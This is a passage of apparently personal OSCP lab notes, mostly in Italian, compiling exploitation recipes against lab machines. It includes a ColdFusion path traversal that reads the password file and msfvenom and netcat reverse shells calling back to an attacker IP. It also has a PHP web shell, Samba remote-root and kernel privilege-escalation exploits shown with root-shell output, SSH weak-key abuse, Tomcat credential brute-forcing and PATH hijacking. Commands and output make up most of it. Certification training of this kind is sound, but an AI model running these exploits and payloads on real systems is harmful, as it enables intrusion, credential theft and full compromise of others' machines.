http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en

We obtain credentials (per un esempio vedi lab OSCP: Mike).
```
Once logged in, go to the "Mappings" section of the "Settings" section and copy the value of the Directory Path of the Logical Path / CFIDE, that is
 **C:\Inetpub\wwwroot\CFIDE**  
 
We generate a payload that we use later:

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.168 LPORT=4444 -f raw > shell.jsp


Now go to the Scheduled Task section of the Debugging & Logging section and add a scheduled task:
Name: ShellTask (any name is fine)
URL: http://192.168.119.168:8000/shell.jsp
File: C:\Inetpub\wwwroot\CFIDE\shell.jsp

Check the ** "Save output to a file" ** box and change the execution time to make it start immediately.
```


### Advanced Comment System 1.0
Remote File Inclusion Vulnerability 
https://www.exploit-db.com/exploits/9623

(Lab OSCP: Phoenix)


### jquery-file-upload
si può sfruttare per caricare qualche file sul server utilizzando curl:
curl -F "files=@/home/kali/Documents/OSCP/XOR-APP59/test.php" http://10.11.1.123/Books/apps/jquery-file-upload/server/php/index.php

Quindi, si può caricare uno script per eseguire una reverse shell:
<?php system('nc.exe 192.168.119.168 4444 -e cmd.exe');?>

Carico sia questo script che nc.exe, metto in listening la mia macchina e poi navigo la pagina:
https://10.11.1.123/Books/apps/jquery-file-upload/server/php/files/test.php


### UnixSamba 2.2.7a
(Vedi Lab OSCP: XOR-APP59)
https://www.exploit-db.com/exploits/22469

```
└─$ gcc 22469.c -o 22469

└─$ ./22469 -t 10.11.1.115

[~] 0x333hate => samba 2.2.x remote root exploit [~]
[~]        coded by c0wboy ~ www.0x333.org       [~]

[-] connecting to 10.11.1.115:139
[-] stating bruteforce

[-] testing 0xbfffffff
[-] testing 0xbffffdff
[-] testing 0xbffffbff
[-] testing 0xbffff9ff
[-] testing 0xbffff7ff
[-] testing 0xbffff5ff
[-] testing 0xbffff3ff
[-] testing 0xbffff1ff
[-] testing 0xbfffefff
Linux tophat.acme.com 2.4.20-8 #1 Thu Mar 13 17:54:28 EST 2003 i686 athlon i386 GNU/Linux
uid=0(root) gid=0(root) groups=99(nobody)
```

### Samba 4.
(Vedi Lab OSCP: Susie)
Con Metasploit: exploit/linux/samba/is_known_pipename

Se all'esecuzione dà questo errore:
```
Exploit failed: RubySMB::Error::EncryptionError Communication error with the remote host: Socket read returned nil. The server supports encryption but was not able to handle the encrypted request.
```

Si deve settare:
```
set SMB::ProtocolVersion 1 
```

potrebbe servire per fixare, anche:
```
set SMB::AlwaysEncrypt false
```


### Samba version 3.0.24
Directory Traversal (con Metasploit)
https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal/

Questa crea un symlink nella directory smb con dentro i file del server.
Quindi, poi, collegandosi in smb si troverà la cartella rootfs in cui ci sono le cartelle di filesystem:
```
    smb: \> cd rootfs
    smb: \rootfs\> ls
      .                                   D        0  Wed Aug 26 05:54:18 2009
      ..                                  D        0  Wed Aug 26 05:54:18 2009
      cdrom                               D        0  Wed Sep  5 19:43:19 2007
      var                                 D        0  Wed Sep  5 19:45:53 2007
      selinux                             D        0  Wed Mar  7 17:56:09 2007
      home                                D        0  Sun Oct  5 19:21:51 2008
      root                                D        0  Fri Mar 12 09:48:33 2021
      vmlinuz                             N  1719072  Sat Aug 29 17:03:53 2009
      lib                                 D        0  Tue Sep 20 02:37:34 2011
      bin                                 D        0  Sun Oct  5 13:45:56 2008
      sys                                 D        0  Wed Mar 10 14:50:37 2021
      srv                                 D        0  Wed Sep  5 19:45:52 2007
      tmp                                 D        0  Fri Mar 12 10:00:02 2021
      lost+found                          D        0  Wed Sep  5 19:43:02 2007
      media                               D        0  Wed Sep  5 19:43:21 2007
      sbin                                D        0  Wed Jan 17 07:52:40 2018
      etc                                 D        0  Wed Mar 10 14:50:56 2021
      initrd.img.old                      N  4877928  Wed Jan 17 07:52:26 2018
      opt                                 D        0  Wed Sep  5 19:45:52 2007
      proc                               DR        0  Wed Mar 10 14:50:37 2021
      mnt                                 D        0  Thu Sep 29 22:23:45 2011
      vmlinuz.old                         N  1455672  Mon Oct 13 04:59:16 2008
      initrd                              D        0  Wed Sep  5 19:45:52 2007
      boot                                D        0  Tue Nov 26 21:14:44 2019
      initrd.img                          N  4917486  Tue Nov 26 21:14:44 2019
      usr                                 D        0  Wed Sep  5 19:45:53 2007
      dev                                 D        0  Wed Mar 10 14:50:56 2021
```
Poi si potrebbe prendere il file **authorized_keys** e applicare l'attacco Debian OpenSSL Predictable PRNG.


### Debian OpenSSL Predictable PRNG
(Vedi Lab OSCP: Sufferance)
https://osandamalith.com/2013/11/16/rooting-pwnos/
https://github.com/g0tmi1k/debian-ssh

In cui si possono utilizzare delle liste di chiavi private,pubbliche che corrispondono al contenuto nel file authorized_keys.
Prima si cerca quale algoritmo è stato utilizzato:
```
┌──(kali㉿kali)-[~/Documents/OSCP/Sufferance]
└─$ ssh-keygen -l -f authorized_keys
1024 SHA256:pazdjoHxCGr2tjH16FVEvuwUTtHte8xK1EJ2nmWSHx4 bob@10.11.1.136 (DSA)
```

Poi si scarica la lista dal link https://github.com/g0tmi1k/debian-ssh e si cerca la chiave pubblica relativa a quella chiave:
```
┌──(kali㉿kali)-[~/Documents/OSCP/Sufferance]
└─$ cd dsa/1024 

┌──(kali㉿kali)-[~/…/OSCP/Sufferance/dsa/1024]
└─$ grep -lr AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3IiFShIfx9bUcUNmyFDM7SaFrVBuuIW+2qnDF7vybPiMNI9/dQ7ck2gLUqPu2F4gfXml8W9RKcqTOVksRmQ5s0O4c88mCqV3F1nzKKMSZbK9yYWbafabX91f2SinBQZbfMGv8+R2TyE78LjAAAAFQDXtJ7Pca0RkEBFcBLfPzmCUBpSeQAAAIEAlK4NYlfGt3uInBaKG0kK/N0nZwX7ji++5xSiLLjI/0M9xacdWaZcPBZ4GretGGIhnYEPlBote8GlG1Ap7li39ATazIXJQguG+Mgun3de73RugX/oGsUt5oatCS2Lo9mfRBijlVYChLyQbgkZMwKziwR1BHUWE/jkCKT7bPEJvw8AAACBAJZHIWHJybvrIcs9oB5hTL/8r+C9gDx+R3vcEFQq58D/UDi5FWzA71IZfcOt2+EPabP77gB6Ad/nNy3BrqmkocwLX+Of1uwMhgD63UeE5fUOuIbW+z4OF1M9tuzFAGALDMHJSx8U8Z11lsiuO4Owx11pAo8Ebq0sKNDd0GzvVQxE *.pub

f1fb2162a02f0f7c40c210e6167f05ca-16858.pub
```

E poi si utilizza per accedere:
```
┌──(kali㉿kali)-[~/…/OSCP/Sufferance/dsa/1024]
└─$ ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858 bob@10.11.1.136 -oKexAlgorithms=+diffie-hellman-group1-sha1 -vv -oPubkeyAcceptedKeyTypes=+ssh-dss

[...]
```

### AJPy - Ghostcat
https://github.com/hypn0s/AJPy

To bruteforce the credentials:
```
    ┌──(kali㉿kali)-[~/Documents/OSCP/Kraken/AJPy]
    └─$ python tomcat.py bf -U /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt /manager/html 10.11.1.209
    Attacking a tomcat at ajp13://10.11.1.209:8009/manager/html
    Found valid credz: tomcat:s3cret
    Here is your cookie: JSESSIONID=C5BEF363A4E34E9F0DDFD24F36B6C2DA; Path=/manager; HttpOnly
```


### Shellshock SMTP Exploit
https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py

Prima si deve enumerare perchè servono delle email esistenti:
We must use the existent email, that we verify before using  VRFY in smtp:
user01 per il from:
data = netFormat("mail from:<user01@mail.local>")
useradm per il to:
data = netFormat("rcpt to:<useradm@mail.local>")

E poi eseguire:
```
└─$ python postfix_testing.py 10.11.1.231 'nc -e /bin/bash 192.168.119.168 4444'
```


### Windows XP SP0/SP1 Privilege Escalation to System
https://sohvaxus.github.io/content/winxp-sp1-privesc.html

Nel link è spiegato bene, usa i seguenti servizi vulnerabili:
```

C:\> accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# If we are on a Windows XP SP0 or SP1 OS we will receive the following output
								 
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS	
```


### Linux 2.6.32-21-generic-pae
```
uname -a
Linux core 2.6.32-21-generic-pae #32-Ubuntu SMP Fri Apr 16 09:39:35 UTC 2010 i686 GNU/Linux
```

**Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege  | linux/local/14814.c**
```
www-data@core:/tmp$ gcc 14814.c
gcc 14814.c
www-data@core:/tmp$ ls
ls
14814.c  a.out	vmware-root
www-data@core:/tmp$ ./a.out
./a.out
[+] looking for symbols...
[+] resolved symbol commit_creds to 0xc0176140
[+] resolved symbol prepare_kernel_cred to 0xc0176480
[+] setting up exploit payload...
[+] creating PF_CAN socket...
[+] connecting PF_CAN socket...
[+] clearing out any active OPs via RX_DELETE...
[+] removing any active user-owned shmids...
[+] massaging kmalloc-96 SLUB cache with dummy allocations
[+] corrupting BCM OP with truncated allocation via RX_SETUP...
[+] mmap'ing truncated memory to short-circuit/EFAULT the memcpy_fromiovec...
[+] mmap'ed mapping of length 328 at 0xb7814000
[+] smashing adjacent shmid with dummy payload via malformed RX_SETUP...
[+] seeking out the smashed shmid_kernel...
[+] discovered our smashed shmid_kernel at shmid[147] = 4817043
[+] re-smashing the shmid_kernel with exploit payload...
[+] launching root shell!
root@core:/tmp# whoami
whoami
root
```


### Linux 4.4.0-116-generic
```
uname -a
    Linux dotty 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

https://www.exploit-db.com/exploits/45010

```
www-data@dotty:/tmp$ ./45010
./45010
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88003d4faf00
[*] Leaking sock struct from ffff880038ef3800
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880035000e40
[*] UID from cred structure: 33, matches the current: 33
[*] hammering cred structure at ffff880035000e40
[*] credentials patched, launching shell...
# whoami
whoami
root
```


### Linux: 2.6.9-89.EL
 Linux: 2.6.9-89.EL
 Distribution: CentOS release 4.8 (Final)
 Architecture: i686

https://www.exploit-db.com/exploits/9545
```
┌──(kali㉿kali)-[~/Documents/OSCP/Phoenix]
└─$ gcc -m32 -Wl,--hash-style=both -Wall 9545.c -o 9545

We must install gcc-multilib to use -m32 in the compilation
the -Wall was in the file .c 
and -Wl,--hash-style=both with the error:
*./shared-binary: error while loading shared libraries: requires glibc 2.5 or later dynamic linker*
```

Oppure:
https://www.exploit-db.com/exploits/9542
```
┌──(kali㉿kali)-[~/Documents/OSCP/Phoenix]
└─$ gcc -m32 -Wl,--hash-style=both -Wall 9542.c -o 9542  
```



### export PATH environment
(Vedi Lab OSCP Sufferance)

Se si vede che un binario, che magari viene eseguito come root, ci sono eseguibili senza path /usr/bin, si può caricare una shell con il nome dell'eseguibile e cambiare il PATH.

```
bob@sufferance:/tmp$ strings /usr/local/bin/uploadtosecure
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
puts
system
__libc_start_main
GLIBC_2.0
PTRh0
[^_]
Archiving files to secure server...
scp -r file/tobesecured/* 10.10.11.100:/var/www/html/files/
```

Qui, per esempio, usa scp, quindi si crea un payload con il nome **scp**:
```
┌──(kali㉿kali)-[~/Documents/OSCP/Sufferance]
└─$ msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o scp
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 43 bytes
Final size of elf file: 127 bytes
Saved as: scp
```

Poi si carica sulla macchina vittima.
Si mettono i permessi di esecuzione, si cambia la variabile d'ambiente PATH con il path in cui è il payload creato e si esegue:
```
bob@sufferance:/usr/local/bin$ chmod 777 /tmp/scp
bob@sufferance:/tmp$ export PATH=/tmp:$PATH
bob@sufferance:/tmp$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/games
bob@sufferance:/tmp$ cd /usr/local/bin/
bob@sufferance:/usr/local/bin$ ./uploadtosecure 
Archiving files to secure server...

sh-3.1# id
uid=1001(bob) gid=1001(bob) euid=0(root) groups=1001(bob)
sh-3.1# whoami
root
```